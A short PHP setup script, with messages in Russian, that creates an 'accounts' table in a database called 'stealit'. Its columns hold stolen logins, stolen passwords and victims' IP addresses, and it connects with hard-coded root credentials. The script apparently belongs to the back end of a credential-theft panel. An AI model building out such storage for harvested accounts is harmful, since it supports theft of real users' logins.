<?php

$pdo = new PDO('mysql:host=localhost;dbname=stealit;charset=utf8', 'root', 'root');

$stmt = $pdo->prepare("CREATE TABLE accounts(steal_id INT NOT NULL AUTO_INCREMENT, user_id INT NOT NULL, stealed_login VARCHAR(40), stealed_pass VARCHAR(40), ip VARCHAR(20), PRIMARY KEY(steal_id), FOREIGN KEY(user_id) REFERENCES users(id))");

$res = $stmt->execute();

if($res)
    echo "Таблица accounts создана успешно <br />";
else
    echo "Таблица accounts не создана <br />";

